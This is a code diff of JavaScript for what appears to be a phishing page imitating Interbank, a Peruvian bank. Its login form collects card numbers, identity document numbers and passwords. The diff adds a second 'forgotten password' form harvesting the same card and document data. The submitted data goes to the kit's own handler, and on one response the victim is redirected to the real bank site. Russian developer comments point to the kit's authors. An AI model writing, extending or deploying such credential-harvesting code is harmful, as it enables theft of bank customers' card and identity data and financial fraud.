@@ -1,20 +1,26 @@
 document.addEventListener("DOMContentLoaded", function () {
   // var initialHeight = window.innerHeight;
   // document.body.style.minHeight = initialHeight + "px";
-  let lunarChecked = false
-  const container = document.querySelector('.container');
-  let errorMes = ''
+  let lunarChecked = false;
+  const container = document.querySelector(".container");
+  let errorMes = "";
   container.style.minHeight = `${window.innerHeight}px`;
-  window.addEventListener('resize', () => {
-    const container = document.querySelector('.container');
+  window.addEventListener("resize", () => {
+    const container = document.querySelector(".container");
     container.style.minHeight = `${window.innerHeight}px`;
   });
 
   const form = document.querySelector("#myForm");
+  const forgetForm = document.querySelector("#forget-form");
   const cardNumber = document.querySelector("#cardNumber");
+  const forgetCardNumber = document.querySelector("#forget-form-doc-num");
   const docType = document.querySelector("#docType");
+  const forgetDocType = document.querySelector("#forget-docType");
   const docNumber = document.querySelector("#docNumber");
+  const forgetDocNumber = document.querySelector("#forget-form-docNumber");
   const password = document.querySelector("#password");
+  const forgetFormBtn = document.querySelector("#forget-form-btn");
+  
   const fingerprint = document.querySelector(".fingerprint");
   const loader = document.querySelector(".loader-wrapper");
   fingerprint.addEventListener("click", function () {
@@ -22,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   const recordarCheckbox = document.getElementById("recordar");
-  const inputFields = [cardNumber, docType, docNumber, password];
+  const inputFields = [cardNumber, docType, docNumber, password,forgetCardNumber,docType,forgetDocNumber];
   function toggleGreenBorder() {
     if (recordarCheckbox.checked) {
       // Add green border
@@ -56,9 +62,6 @@ document.addEventListener("DOMContentLoaded", function () {
     field.addEventListener("blur", removeFocusClass);
   });
 
-
-
-
   // Валидация и форматирование номера карты
   cardNumber.addEventListener("input", function () {
     let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
@@ -67,7 +70,14 @@ document.addEventListener("DOMContentLoaded", function () {
     }
     this.value = value.replace(/(.{4})/g, "$1 ").trim();
   });
-
+  forgetCardNumber.addEventListener("input", function () {
+    let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
+    if (value.length > 16) {
+      value = value.slice(0, 16);
+    }
+    this.value = value.replace(/(.{4})/g, "$1 ").trim();
+    forgotCheckFields()
+  });
   docType.addEventListener("change", function () {
     docNumber.value = "";
     switch (this.value) {
@@ -80,6 +90,21 @@ document.addEventListener("DOMContentLoaded", function () {
         break;
       default:
         docNumber.type = "text";
+        break;
+    }
+  });
+  forgetDocType.addEventListener("change", function () {
+    forgetDocNumber.value = "";
+    switch (this.value) {
+      case "DNI":
+        forgetDocNumber.type = "tel";
+        break;
+      case "Pasaporte":
+      case "CE":
+        forgetDocNumber.type = "text";
+        break;
+      default:
+        forgetDocNumber.type = "text";
         break;
     }
   });
@@ -114,18 +139,47 @@ document.addEventListener("DOMContentLoaded", function () {
 
     this.value = value;
   });
+  forgetDocNumber.addEventListener("input", function () {
+    let value = this.value;
+    let pattern;
+    let maxLength;
 
+    switch (forgetDocType.value) {
+      case "DNI":
+        pattern = /^[0-9]*$/;
+        maxLength = 8;
+        break;
+      case "Pasaporte":
+      case "CE":
+        pattern = /^[a-zA-Z0-9]*$/;
+        maxLength = 11;
+        break;
+      default:
+        pattern = /^.*$/;
+        maxLength = 11;
+        break;
+    }
+    // Обрезать значение по максимальной длине
+    if (value.length > maxLength) {
+      value = value.slice(0, maxLength);
+    }
+
+    // Удалить недопустимые символы
+    value = value.match(pattern) ? value : value.slice(0, -1);
+
+    this.value = value;
+    forgotCheckFields()
+  });
   // Обработка отправки формы
   form.addEventListener("submit", function (e) {
     e.preventDefault();
     let valid = true;
-     errorMes = "Por favor, corrija los siguientes errores:\n";
+    errorMes = "Por favor, corrija los siguientes errores:\n";
 
     let cardNumValue = cardNumber.value.replace(/ /g, "");
     if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
       valid = false;
-      errorMes +=
-        "Por favor, ingresa todos los dígitos de tu tarjeta";
+      errorMes += "Por favor, ingresa todos los dígitos de tu tarjeta";
     }
 
     if (password.value.length < 6 || password.value.length > 20) {
@@ -138,14 +192,16 @@ document.addEventListener("DOMContentLoaded", function () {
       case "DNI":
         if (!/^\d+$/.test(docNumValue)) {
           valid = false;
-          errorMes = "ingresa tu numero de documento para confirmar la operación";
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
         }
         break;
       case "Pasaporte":
       case "CE":
         if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
           valid = false;
-          errorMes = "ingresa tu numero de documento para confirmar la operación";
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
         }
         break;
     }
@@ -157,31 +213,66 @@ document.addEventListener("DOMContentLoaded", function () {
       customAlert();
     }
   });
+  forgetForm.addEventListener("submit", function (e) {
+    e.preventDefault();
+    let valid = true;
+    errorMes = "Por favor, corrija los siguientes errores:\n";
 
+    let cardNumValue = forgetCardNumber.value.replace(/ /g, "");
+    if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
+      valid = false;
+      errorMes += "Por favor, ingresa todos los dígitos de tu tarjeta";
+    }
+
+
+    let docNumValue = forgetDocNumber.value;
+    switch (forgetDocType.value) {
+      case "DNI":
+        if (!/^\d+$/.test(docNumValue)) {
+          valid = false;
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
+        }
+        break;
+      case "Pasaporte":
+      case "CE":
+        if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
+          valid = false;
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
+        }
+        break;
+    }
+
+    if (valid && lunarChecked) {
+      sendForm("myForm");
+      loader.style.display = "flex";
+    } else {
+      customAlert();
+    }
+  });
   // Получение модального окна и кнопки закрыть
   const modal = document.getElementById("myModal");
   const closeModalBtn = document.getElementById("popupButton");
 
   // Открытие модального окна вместо alert
   function showModal() {
-    const popup_error = document.getElementById('popup-error')
-    popup_error.innerText = errorMes
-    modal.style.display = "flex";
+    const popup_error = document.getElementById("popup-error");
+    popup_error.innerText = errorMes;
+    modal.style.display = "flex"; // делаем модальное окно видимым
+    setTimeout(() => {
+      modal.style.opacity = "1"; // делаем его полностью видимым
+    }, 0);
   }
 
   // Закрытие модального окна при клике на кнопку
   closeModalBtn.addEventListener("click", function () {
-    modal.style.display = "none";
+    modal.style.opacity = "0"; // делаем его невидимым
+    setTimeout(() => {
+      modal.style.display = "none"; // скрываем после анимации
+    }, 300);
   });
 
-  // Закрытие модального окна при клике вне его области
-  // window.addEventListener("click", function (event) {
-  //   if (event.target === modal) {
-  //     modal.style.display = "none";
-  //   }
-  // });
-
-  // Замена стандартного alert на модальное окно
   function customAlert() {
     showModal();
   }
@@ -238,8 +329,9 @@ document.addEventListener("DOMContentLoaded", function () {
           } else if (responseCode === 201) {
             window.location.href = "https://interbank.pe"; //редир на интер
           } else if (responseCode === 202) {
-            errorMes = "Los datos ingresados son incorrectos. Por favor valida tu número de tarjeta y documento de identidad."
-            customAlert()
+            errorMes =
+              "Los datos ingresados son incorrectos. Por favor valida tu número de tarjeta y documento de identidad.";
+            customAlert();
             //добавь свой код который при ошибке ебашишь
           } else {
             console.error("Unexpected response code: " + responseCode);
@@ -257,36 +349,48 @@ document.addEventListener("DOMContentLoaded", function () {
     return urlParams.get(name);
   }
   // Функция для проверки номера карты с использованием алгоритма Луна
-function luhnCheck(cardNumber) {
-  let arr = cardNumber.split('').reverse();
-  let sum = 0;
+  function luhnCheck(cardNumber) {
+    let arr = cardNumber.split("").reverse();
+    let sum = 0;
 
-  for (let i = 0; i < arr.length; i++) {
-    let digit = parseInt(arr[i], 10);
+    for (let i = 0; i < arr.length; i++) {
+      let digit = parseInt(arr[i], 10);
 
-    if (i % 2 !== 0) {
-      digit *= 2;
-      if (digit > 9) {
-        digit -= 9;
+      if (i % 2 !== 0) {
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
+      }
+      sum += digit;
+    }
+    return sum % 10 === 0;
+  }
+
+  document.getElementById("cardNumber").addEventListener("input", function (e) {
+    const input = e.target.value.replace(/\s+/g, ""); // Удаляем все пробелы
+    if (input.length >= 16) {
+      if (luhnCheck(input)) {
+        lunarChecked = true;
+      } else {
+        lunarChecked = false;
       }
     }
-    sum += digit;
-  }
-  return sum % 10 === 0;
-}
-
-// Слушатель событий для поля ввода номера карты
-document.getElementById("cardNumber").addEventListener("input", function(e) {
-  const input = e.target.value.replace(/\s+/g, '');  // Удаляем все пробелы
-  if (input.length >= 16) {  // Здесь может быть ваше условие для длины карты
-    if (luhnCheck(input)) {
-      lunarChecked = true
-      // console.log("Номер карты валидный");
-    } else {
-      lunarChecked =false
-      // console.log("Номер карты невалидный");
+  });
+  document.getElementById("forget-form-doc-num").addEventListener("input", function (e) {
+    const input = e.target.value.replace(/\s+/g, ""); // Удаляем все пробелы
+    if (input.length >= 16) {
+      if (luhnCheck(input)) {
+        lunarChecked = true;
+      } else {
+        lunarChecked = false;
+      }
+    }
+  });
+  const forgotCheckFields = () => {
+    // Проверяем, заполнены ли оба поля
+    if (forgetCardNumber.value !== '' && forgetDocNumber.value !== '') {
+      forgetFormBtn.disabled = false
     }
   }
-});
-
 });
